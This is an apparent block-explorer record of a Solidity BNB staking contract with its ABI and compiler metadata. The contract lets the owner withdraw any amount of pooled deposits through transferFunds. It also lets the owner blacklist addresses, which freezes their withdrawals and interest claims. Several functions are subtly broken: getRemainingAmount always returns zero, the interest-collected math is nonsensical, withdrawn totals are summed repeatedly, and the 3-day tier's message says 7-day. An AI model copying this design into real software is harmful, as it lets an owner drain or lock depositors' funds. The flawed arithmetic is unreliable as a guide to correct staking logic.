{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nstruct DepositInfo {\r\n    uint256 amount;\r\n    uint256 lockupPeriod;\r\n    uint256 interestRate;\r\n    uint256 depositTime;\r\n    uint256 lastClaimTime;\r\n}\r\n\r\ncontract BNBStakingContract {\r\n    address payable private _owner;\r\n    \r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => uint256) private _lastClaimTime;\r\n    mapping(address => uint256) private _lockupPeriod;\r\n    mapping(address => uint256) private _interestRate;\r\n    mapping(address => bool) private _blacklisted;\r\n    mapping(address => address) private _referrals;\r\n    mapping(address => uint256) private _initialDeposits;\r\n    mapping(address => uint256) private _depositTime;\r\n    mapping(address => DepositInfo[]) private _deposits;\r\n    mapping(address => uint256) private _totalWithdrawnAmounts;\r\n    \r\n    event Deposit(address indexed user, uint256 amount, uint256 lockupPeriod);\r\n    event Withdraw(address indexed user, uint256 amount);\r\n    event InterestClaimed(address indexed user, uint256 amount);\r\n    event Blacklisted(address indexed user);\r\n    event Unblacklisted(address indexed user);\r\n\r\n    constructor() {\r\n        _owner = payable(msg.sender);\r\n    }\r\n\r\n    modifier onlyOwner {\r\n        require(msg.sender == _owner, \"Not the contract owner.\");\r\n        _;\r\n    }\r\n\r\n\r\nfunction deposit(uint256 lockupPeriod, address referral) external payable {\r\n        require(lockupPeriod >= 3 && lockupPeriod <= 90, \"Invalid lockup period.\");\r\n        require(!_blacklisted[msg.sender], \"You are not allowed to deposit.\");\r\n\r\n        uint256 currentLockupPeriod = lockupPeriod * 1 days;\r\n        uint256 currentInterestRate;\r\n\r\nif (lockupPeriod == 3) {\r\n    require(msg.value >= 10**18 && msg.value <= 10**19, \"Invalid deposit amount for 7-day lockup.\");\r\n    currentInterestRate = 66666666666667; // 0.066666666666667%\r\n} else if (lockupPeriod == 14) {\r\n    require(msg.value >= 10**19 && msg.value <= 3 * 10**19, \"Invalid deposit amount for 14-day lockup.\");\r\n    currentInterestRate = 107142857142857; // 0.107142857142857%\r\n} else if (lockupPeriod == 30) {\r\n    require(msg.value >= 25 * 10**18 && msg.value <= 5 * 10**19, \"Invalid deposit amount for 30-day lockup.\");\r\n    currentInterestRate = 133333333333333; // 0.133333333333333%\r\n} else if (lockupPeriod == 60) {\r\n    require(msg.value >= 4 * 10**19 && msg.value <= 10**20, \"Invalid deposit amount for 60-day lockup.\");\r\n    currentInterestRate = 150000000000000; // 0.15%\r\n} else if (lockupPeriod == 90) {\r\n    require(msg.value >= 5 * 10**19 && msg.value <= 2 * 10**20, \"Invalid deposit amount for 90-day lockup.\");\r\n    currentInterestRate = 166666666666667; // 0.166666666666667%\r\n}\r\n\r\n    if (_referrals[msg.sender] == address(0) && referral != msg.sender && referral != address(0)) {\r\n        _referrals[msg.sender] = referral;\r\n    }\r\n\r\n       DepositInfo memory newDeposit = DepositInfo({\r\n            amount: msg.value,\r\n            lockupPeriod: currentLockupPeriod,\r\n            interestRate: currentInterestRate,\r\n            depositTime: block.timestamp,\r\n            lastClaimTime: block.timestamp\r\n        });\r\n\r\n    _balances[msg.sender] += msg.value;\r\n    _lockupPeriod[msg.sender] = currentLockupPeriod;\r\n    _interestRate[msg.sender] = currentInterestRate;\r\n    _depositTime[msg.sender] = block.timestamp;\r\n    _lastClaimTime[msg.sender] = block.timestamp;\r\n    _initialDeposits[msg.sender] = msg.value;\r\n    _deposits[msg.sender].push(newDeposit);\r\n\r\n    emit Deposit(msg.sender, msg.value, lockupPeriod);\r\n}\r\n\r\n\r\n    function blacklist(address user) external onlyOwner {\r\n        require(!_blacklisted[user], \"User is already blacklisted.\");\r\n        _blacklisted[user] = true;\r\n\r\n        emit Blacklisted(user);\r\n    }\r\n\r\n    function getTotalWithdrawnAmount(address user, uint256 lockupPeriod) external view returns (uint256) {\r\n        uint256 totalWithdrawn = 0;\r\n        for (uint256 i = 0; i < _deposits[user].length; i++) {\r\n            if (_deposits[user][i].lockupPeriod == lockupPeriod * 1 days) {\r\n                totalWithdrawn += _totalWithdrawnAmounts[user];\r\n            }\r\n        }\r\n        return totalWithdrawn;\r\n    }\r\n\r\nfunction getRemainingAmount(address user) external view returns (uint256) {\r\n    uint256 totalDeposits = 0;\r\n    uint256 totalRemaining = 0;\r\n\r\n    for (uint256 i = 0; i < _deposits[user].length; i++) {\r\n        totalDeposits += _deposits[user][i].amount;\r\n        if (_deposits[user][i].amount > 0) {\r\n            totalRemaining += _deposits[user][i].amount;\r\n        }\r\n    }\r\n\r\n    return totalDeposits - totalRemaining;\r\n}\r\n\r\n    function unblacklist(address user) external onlyOwner {\r\n        require(_blacklisted[user], \"User is not blacklisted.\");\r\n        _blacklisted[user] = false;\r\n\r\n        emit Unblacklisted(user);\r\n    }\r\n\r\nfunction withdraw(uint256 depositIndex) external {\r\n    require(!_blacklisted[msg.sender], \"You are not allowed to withdraw.\");\r\n    require(depositIndex < _deposits[msg.sender].length, \"Invalid deposit index.\");\r\n    require(block.timestamp >= _deposits[msg.sender][depositIndex].depositTime + _deposits[msg.sender][depositIndex].lockupPeriod, \"Lockup period not over.\");\r\n    \r\n    uint256 amountToWithdraw = _deposits[msg.sender][depositIndex].amount;\r\n    require(amountToWithdraw > 0, \"No funds to withdraw.\");\r\n\r\n    _deposits[msg.sender][depositIndex].amount = 0;\r\n    _totalWithdrawnAmounts[msg.sender] += amountToWithdraw; // Store the withdrawn amount\r\n    payable(msg.sender).transfer(amountToWithdraw);\r\n\r\n    emit Withdraw(msg.sender, amountToWithdraw);\r\n}\r\n\r\nfunction transferFunds(uint256 amount) external onlyOwner {\r\n    _owner.transfer(amount);\r\n}\r\n\r\n    function calculateInterest(address user, uint256 depositIndex) public view returns (uint256) {\r\n        DepositInfo storage deposit = _deposits[user][depositIndex];\r\n        uint256 interestClaimed = _deposits[user][depositIndex].amount - _deposits[user][depositIndex].amount;\r\n        uint256 timeElapsed = block.timestamp - deposit.lastClaimTime;\r\n        uint256 interest = (deposit.amount * deposit.interestRate * timeElapsed) / (100000000000000000 * 86400); // 86400 seconds in a day\r\n        return interest + interestClaimed;\r\n    }\r\n\r\nfunction claimInterestForDeposit(uint256 lockupPeriod) external {\r\n    require(!_blacklisted[msg.sender], \"You are not allowed to claim interest.\");\r\n\r\n    uint256 totalInterestToClaim = 0;\r\n\r\n        for (uint256 i = 0; i < _deposits[msg.sender].length; i++) {\r\n            if (_deposits[msg.sender][i].lockupPeriod == lockupPeriod * 1 days) {\r\n            uint256 interestToClaim = calculateInterest(msg.sender, i);\r\n            require(interestToClaim > 0, \"No interest to claim.\");\r\n\r\n            _deposits[msg.sender][i].lastClaimTime = block.timestamp;\r\n            totalInterestToClaim += interestToClaim;\r\n        }\r\n    }\r\n\r\n    payable(msg.sender).transfer(totalInterestToClaim);\r\n\r\n    emit InterestClaimed(msg.sender, totalInterestToClaim);\r\n}\r\n\r\nfunction getDepositInfo(address user) external view returns (uint256[] memory depositIndices, uint256[] memory unlockTimes, uint256[] memory stakedAmounts, uint256[] memory lockupPeriods) {\r\n     uint256 depositCount = _deposits[user].length;\r\n\r\n     depositIndices = new uint256[](depositCount);\r\n     unlockTimes = new uint256[](depositCount);\r\n     stakedAmounts = new uint256[](depositCount);\r\n     lockupPeriods = new uint256[](depositCount);\r\n\r\n     for (uint256 i = 0; i < depositCount; i++) {\r\n         depositIndices[i] = i;\r\n         unlockTimes[i] = _deposits[user][i].depositTime + _deposits[user][i].lockupPeriod;\r\n         stakedAmounts[i] = _deposits[user][i].amount;\r\n         lockupPeriods[i] = _deposits[user][i].lockupPeriod;\r\n     }\r\n }\r\n\r\n    function getDepositStatus(address user, uint256 lockupPeriod) external view returns (uint256[] memory depositIndices, uint256[] memory remainingTimes, uint256[] memory interestsCollected, uint256[] memory interestsNotCollected, uint256[] memory nextInterestClaims) {\r\n        uint256 depositCount = 0;\r\n\r\n        for (uint256 i = 0; i < _deposits[user].length; i++) {\r\n            if (_deposits[user][i].lockupPeriod == lockupPeriod * 1 days) {\r\n                depositCount++;\r\n            }\r\n        } \r\n\r\n     depositIndices = new uint256[](depositCount);\r\n     remainingTimes = new uint256[](depositCount);\r\n     interestsCollected = new uint256[](depositCount);\r\n     interestsNotCollected = new uint256[](depositCount);  \r\n     nextInterestClaims = new uint256[](depositCount);  \r\n\r\n        uint256 depositIndex = 0;\r\n        for (uint256 i = 0; i < _deposits[user].length; i++) {\r\n            if (_deposits[user][i].lockupPeriod == lockupPeriod * 1 days) {\r\n             depositIndices[depositIndex] = i;\r\n             if (block.timestamp < _deposits[user][i].depositTime + _deposits[user][i].lockupPeriod) {\r\n                 remainingTimes[depositIndex] = _deposits[user][i].depositTime + _deposits[user][i].lockupPeriod - block.timestamp;\r\n             } else {\r\n                 remainingTimes[depositIndex] = 0;\r\n             }\r\n             \r\ninterestsCollected[depositIndex] = _deposits[user][i].lastClaimTime - _deposits[user][i].depositTime * _deposits[user][i].amount * _deposits[user][i].interestRate / 100;\r\n             interestsNotCollected[depositIndex] = calculateInterest(user, i);  \r\n             int256 nextClaim = int256(_deposits[user][i].lastClaimTime + 30 * 1 minutes) - int256(block.timestamp);\r\n             nextInterestClaims[depositIndex] = uint256(max(nextClaim, 0));\r\n             depositIndex++;\r\n         }\r\n     }\r\n}\r\n\r\nfunction max(int256 a, int256 b) private pure returns (int256) {\r\n    return a >= b ? a : b;\r\n}\r\n\r\nfunction getNumberOfDeposits(address user) external view returns (uint256) {\r\n    return _deposits[user].length;\r\n}\r\n\r\n    function getReferral(address user) external view returns (address) {\r\n        return _referrals[user];\r\n    }\r\n\r\n    function getLockupPeriod(address user) external view returns (uint256) {\r\n        return _lockupPeriod[user];\r\n    }\r\n\r\n    function getInterestRate(address user) external view returns (uint256) {\r\n        return _interestRate[user];\r\n    }\r\n\r\n    function getBalance(address user) external view returns (uint256) {\r\n        return _balances[user];\r\n    }\r\n\r\n    function isBlacklisted(address user) external view returns (bool) {\r\n        return _blacklisted[user];\r\n    }\r\n\r\n    function getLastClaimTime(address user) external view returns (uint256) {\r\n        return _lastClaimTime[user];\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"Blacklisted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"lockupPeriod\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"InterestClaimed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"Unblacklisted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"blacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"depositIndex\",\"type\":\"uint256\"}],\"name\":\"calculateInterest\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"lockupPeriod\",\"type\":\"uint256\"}],\"name\":\"claimInterestForDeposit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"lockupPeriod\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"}],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getDepositInfo\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"depositIndices\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"unlockTimes\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"stakedAmounts\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"lockupPeriods\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"lockupPeriod\",\"type\":\"uint256\"}],\"name\":\"getDepositStatus\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"depositIndices\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"remainingTimes\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"interestsCollected\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"interestsNotCollected\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"nextInterestClaims\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getInterestRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getLastClaimTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getLockupPeriod\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getNumberOfDeposits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getReferral\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getRemainingAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"lockupPeriod\",\"type\":\"uint256\"}],\"name\":\"getTotalWithdrawnAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isBlacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFunds\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"unblacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"depositIndex\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BNBStakingContract", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://739b31c897fa1a5741eca4ecb3dacd926bff31d125baf37f382d1c8b82d814ee"}